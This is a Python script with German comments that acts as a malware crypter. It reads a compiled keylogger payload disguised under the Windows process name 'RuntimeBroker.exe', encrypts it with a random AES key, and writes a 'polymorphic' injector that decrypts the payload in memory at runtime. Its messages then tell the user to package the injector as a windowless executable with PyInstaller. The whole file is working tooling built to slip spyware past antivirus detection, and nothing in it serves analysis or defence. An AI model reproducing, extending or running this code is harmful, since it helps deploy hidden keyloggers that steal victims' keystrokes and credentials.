import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import binascii

# --- Konfiguration ---
PAYLOAD_FILE = r"dist\RuntimeBroker.exe"
INJECTOR_TEMPLATE_FILE = "_injector_syscall.py"
OUTPUT_INJECTOR_FILE = "injector_crypted.py"

# --- Implementierung ---

def create_polymorphic_injector():
    """
    Erstellt einen polymorphen Injektor, indem es die Payload verschlüsselt
    und einen neuen Injektor-Code mit der verschlüsselten Payload und dem Schlüssel generiert.
    """
    print("[*] Operation Stählung: Polymorpher Injektor wird erstellt...")

    # 1. Payload einlesen
    try:
        with open(PAYLOAD_FILE, "rb") as f:
            payload_data = f.read()
        print(f"[+] Payload '{PAYLOAD_FILE}' erfolgreich gelesen ({len(payload_data)} bytes).")
    except FileNotFoundError:
        print(f"[!] FEHLER: Payload-Datei '{PAYLOAD_FILE}' nicht gefunden. Bitte zuerst den Keylogger kompilieren.")
        return

    # 2. Zufälligen AES-Schlüssel und IV generieren
    key = get_random_bytes(16)  # AES-128
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    print(f"[+] AES-Schlüssel generiert: {binascii.hexlify(key).decode()}")

    # 3. Payload verschlüsseln und padden
    encrypted_payload = cipher.encrypt(pad(payload_data, AES.block_size))
    print(f"[+] Payload erfolgreich verschlüsselt.")

    # 4. Injektor-Vorlage einlesen
    try:
        with open(INJECTOR_TEMPLATE_FILE, "r") as f:
            template_code = f.read()
        print(f"[+] Injektor-Vorlage '{INJECTOR_TEMPLATE_FILE}' gelesen.")
    except FileNotFoundError:
        print(f"[!] FEHLER: Injektor-Vorlage '{INJECTOR_TEMPLATE_FILE}' nicht gefunden.")
        return

    # 5. Neuen, polymorphen Injektor-Code erstellen
    # Wir fügen einen Entschlüsselungs-Header am Anfang des Skripts ein.
    
    decryption_header = f"""
# --- Polymorpher Header (Automatisch generiert) ---
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

ENCRYPTED_PAYLOAD = {encrypted_payload!r}
AES_KEY = {key!r}
AES_IV = {iv!r}

def get_payload():
    """Entschlüsselt die Payload zur Laufzeit im Speicher."""
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    decrypted_payload = unpad(cipher.decrypt(ENCRYPTED_PAYLOAD), AES.block_size)
    return decrypted_payload
# --- Ende des Headers ---

"""
    # Wir entfernen die alte 'get_payload' Funktion aus der Vorlage.
    # Dies ist ein einfacher, aber effektiver Weg.
    cleaned_template = "\n".join([line for line in template_code.splitlines() if "def get_payload():" not in line and "PAYLOAD_MARKER" not in line])
    
    final_code = decryption_header + cleaned_template
    
    with open(OUTPUT_INJECTOR_FILE, "w") as f:
        f.write(final_code)
        
    print(f"[+] Der neue polymorphe Injektor wurde als '{OUTPUT_INJECTOR_FILE}' gespeichert.")
    print("[*] Nächster Schritt: Kompilieren Sie diese neue Datei mit PyInstaller.")
    print(f"   -> pyinstaller --noconsole --onefile --name FinalPackage_v4 {OUTPUT_INJECTOR_FILE}")


if __name__ == "__main__":
    # Stelle sicher, dass die Krypto-Bibliothek installiert ist
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] FEHLER: PyCryptodome ist nicht installiert. Bitte führen Sie 'pip install pycryptodome' aus.")
    else:
        create_polymorphic_injector() 